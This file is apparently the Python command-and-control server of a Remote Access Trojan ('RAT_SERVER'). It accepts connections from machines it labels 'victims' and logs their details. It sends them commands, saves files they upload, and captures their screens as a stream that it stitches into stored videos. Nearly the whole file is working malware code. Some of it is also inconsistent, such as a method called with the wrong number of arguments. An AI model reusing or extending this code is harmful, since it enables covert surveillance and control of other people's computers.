import socket
from host.handler.command_handler import execute_command
from host.handler import command_importer
import select
import threading
import os
import datetime
import cv2
import io
import struct


class SingletonMeta(type):
    _instances = {}

    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            instance = super(SingletonMeta, cls).__call__(*args, **kwargs)
            cls._instances[cls] = instance
        return cls._instances[cls]


class RAT_SERVER(metaclass=SingletonMeta):
    instance = None  # Class variable to store the instance

    def __init__(self, host, port):
        if not RAT_SERVER.instance:
            self.host = host
            self.port = port
            self.clients = []  # The connection with the clients

            self.screen_share_clients = []  # The clients that are currently screen sharing
            # Information about the clients but more for information instead of the connection available
            self.victims = []
            RAT_SERVER.instance = self  # Set the instance to this object

    def build_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for clients...")

        while True:
            client, addr = s.accept()
            self.clients.append((client, addr))
            print(f"[*] Connection is established successfully with {addr[0]}")

            output = self.receive_output(client)

            output = output.split("|")
            output_dict = {}
            for item in output:
                item = item.split(":")
                item[1] = item[1].replace("colon", ":")
                output_dict[item[0]] = item[1]

            print(
                f"[*] Adding {output_dict['Name']} to the list of victims")

            for victim in self.victims:
                if victim["Name"] == output_dict["Name"]:
                    self.victims.remove(victim)
            self.victims.append(output_dict)

    def receive_output(self, client_socket):
        try:
            print("Receiving output")

            ready = select.select([client_socket], [], [], 5)

            if ready[0]:
                return client_socket.recv(100024).decode()
            else:
                return "Error receiving output"
        except Exception as e:
            print(f"Error receiving output: {str(e)}")

    def handle_client(self, client_socket):
        while True:
            try:
                command = client_socket.recv(1024).decode()
                if not command:
                    break
                output = self.execute(command, client_socket)
                if output is not None:
                    client_socket.send(output.encode())
            except Exception as e:
                print(f"Error handling client: {str(e)}")
                break

        client_socket.close()

    def execute(self, command_type, command, client_socket):
        # Execute the command
        try:
            execute_command(self, command_type, command, client_socket)
        except Exception as e:
            output = str(e)
            print(f"Error executing command: {output}")
            return output

    def upload_file(self, file, client_socket):
        # Save the file

        # Make the directory if it doesn't exist
        # directory should be data/<client_name>/images/<filename>
        directory = f"data/{client_socket.getpeername()[0]}/images/"
        if not os.path.exists(directory):
            os.makedirs(directory)

        filename = file.filename
        filepath = directory + filename

        with open(filepath, "wb") as f:
            f.write(file.file.read())

        print(f"[*] File saved to {filepath}")

    def build_screenshare_connection(self):
        # Start the socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, 8080))
        s.listen(5)
        self.connection = s.accept()[0].makefile('rb')
        print("[*] Waiting for screenshare clients...")

        while True:
            client, addr = s.accept()
            if addr in self.screen_share_clients:
                continue

            self.screen_share_clients.append((client, addr))
            print(
                f"\n[*] Connection is established successfully with {addr[0]}")

            print("[*] Starting new thread to handle screenshare client\n")
            # Start a new thread to handle the client
            t = threading.Thread(
                target=self.handle_screenshare_client, args=(client,))
            t.start()

    def handle_screenshare_client(self, screenshare_socket):
        # Will handle the client, this is used when we are listenening for a clietns screenshare connection.
        # We will turn the images into a video.
        # Then make the video accessable from another python file, which will
        # send it to the web
        print("[*] Handling screenshare client" + str(screenshare_socket))

        # Make the directory if it doesn't exist
        # directory should be data/<client_name>/screenshare/<date>
        directory = f"data/{screenshare_socket.getpeername()[0]}/screenshare/"
        if not os.path.exists(directory):
            os.makedirs(directory)

        if not os.path.exists(directory):
            # Create the directory only if it doesn't already exist
            os.makedirs(directory)

        # Now since we have a client connection already, we will have to listen for images, then
        # use them to make a video
        # DO not store the images, just make the video

        # Make the video
        frames = []
        out = None  # Initialize the VideoWriter outside the loop
        while True:
            try:
                # Get the image
                print("Getting image")
                img = self.get_screenshot(screenshare_socket)
                print("Image gotten !")

                # Save this as a image
                cv2.imwrite(
                    "temp" + datetime.datetime.now().strftime("%H%M%S") + ".jpg", img)

                if img is not None:
                    # Add the image to the frames
                    frames.append(img)

                    if out is None:
                        # Get image dimensions from the first image
                        frame_height, frame_width, _ = img.shape
                        fourcc = cv2.VideoWriter_fourcc(*'XVID')
                        out = cv2.VideoWriter(
                            f"{directory}video.avi", fourcc, 20.0, (frame_width, frame_height))

            except Exception as e:
                print(f"Error getting image: {str(e)}")
                break

        if out is not None:
            for frame in frames:
                out.write(frame)

            out.release()
            cv2.destroyAllWindows()
        print("[*] Directory Saved at " + directory)

        # Store the video path in the victims dict
        for victim in self.victims:
            # if victim["IP"] == screenshare_socket.getpeername()[0]:
            victim["Video"] = f"{directory}video.avi"
            break

    def get_screenshot(self, client_socket):
        # Get the image
        while True:
            chunk = client_socket.recv(40096)

            image_len = struct.unpack(
                '<L', self.connection.read(struct.calcsize('<L')))[0]
            if not image_len:
                break

            image_stream = io.BytesIO()
            image_stream.write(self.connection.read(image_len))

            image_stream.seek(0)
            chunk = image_stream.read()
            # Save the image just for testing purposes
            # cv2.imwrite("temp" + datetime.datetime.now().strftime("%H%M%S") + ".jpg", chunk)
            img_data = chunk

        return img_data if img_data else None
